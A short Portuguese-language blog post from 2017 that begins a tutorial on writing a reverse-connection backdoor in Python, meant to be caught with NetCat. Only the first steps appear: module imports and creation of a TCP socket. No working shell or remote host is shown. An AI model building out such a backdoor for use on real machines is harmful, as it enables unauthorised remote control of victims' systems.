---
layout: post
title:  "BlackDoor em Python"
date:   2017-12-18
---
<figure>
	<img src="{{ '/assets/img/ imagem aqui' | prepend: site.baseurl }}" alt=""> 
	
</figure>
<p class="intro"><span class="dropcap"> S</span>imples "BkacDor" em python para conexão revessa, você pode usar o NetCat ou criar um servido em python para estar ouvindo o"BkacDor".

<dt>1.<dt/>vamos importa as bibliotecas necessarias para o funcionamento do BackDoor.</dt> 

{% highlight python %}
#!/usr/bin/python
import socket,subprocess, os
# ou 
import socket
import subprocess
import os
{% endhighlight %}

<dt>2. Vamos definir qual tipo de socket queremos, para este caso vamos usar socket TCP</dt>

{% highlight python %}
# TCP Socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

{% endhighlight %}

